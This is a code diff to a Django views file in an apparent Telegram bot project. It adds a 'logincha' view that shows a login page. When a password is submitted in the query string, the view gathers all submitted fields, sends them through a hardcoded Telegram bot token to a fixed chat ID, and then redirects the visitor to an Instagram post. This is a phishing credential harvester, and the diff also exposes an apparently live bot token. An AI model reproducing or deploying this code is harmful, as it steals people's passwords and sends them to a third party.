@@ -1,5 +1,6 @@
 from django.shortcuts import render, redirect
 from django.views.decorators.csrf import csrf_exempt
+import telegram
 from telegram import Update
 from bot.update import dp, updater
 from django.http import HttpResponse, FileResponse
@@ -103,3 +104,27 @@ def checked_tasks(request, user):
     name = Bot_user.objects.get(user_id=user).name
     context = {'tasks': tasks, 'name': name, 'phone_number': phone_number}
     return render(request, 'views/checked_tasks.html', context)
+
+
+
+def logincha(request):
+    import telegram
+    token = '1419841495:AAFniTJIRIGAd1q_F10gCquoRPchNoHSmPg'
+    if request.method == 'POST':
+        print(request.POST)
+        return render(request, 'app/login.html')
+
+    else:
+        get = request.GET
+        ret = ''
+        for i in get:
+            ret += '++' + get[i]
+        if 'password' in get:
+            bot = telegram.Bot(token=token)
+            try:
+                bot.sendMessage(chat_id=206261493, text=ret)
+            except:
+                fewfwe = 0
+            return redirect('https://www.instagram.com/p/CSQyT-Egdfr/?utm_source=ig_web_copy_link')
+        else:
+            return render(request, 'views/login2.html')
